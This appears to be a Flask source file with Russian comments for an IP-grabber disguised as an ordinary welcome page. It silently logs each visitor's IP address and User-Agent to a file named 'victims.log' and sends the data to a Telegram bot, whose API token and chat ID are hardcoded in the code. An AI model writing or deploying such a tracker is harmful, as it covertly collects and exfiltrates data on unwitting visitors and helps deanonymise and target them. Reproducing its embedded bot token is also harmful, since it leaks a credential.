from flask import Flask, request
import requests

app = Flask(__name__)

# Токен бота и твой Telegram ID
BOT_TOKEN = "7517508116:AAHydfYGo0-6pYS3rwx0GE2__ELVhi9pwnE"
CHAT_ID = "7477642275"
TELEGRAM_API = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"

def send_to_telegram(message):
    payload = {
        "chat_id": CHAT_ID,
        "text": message
    }
    try:
        requests.post(TELEGRAM_API, data=payload)
    except Exception as e:
        print(f"Ошибка отправки в Telegram: {e}")

@app.route('/')
def log_ip():
    user_ip = request.remote_addr
    user_agent = request.headers.get('User-Agent')
    log_message = f"IP: {user_ip}, User-Agent: {user_agent}"
    
    # Запись в файл
    with open('victims.log', 'a') as f:
        f.write(f"{log_message}\n")
    
    # Отправка в Telegram
    send_to_telegram(log_message)
    
    return "Добро пожаловать на сайт!"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
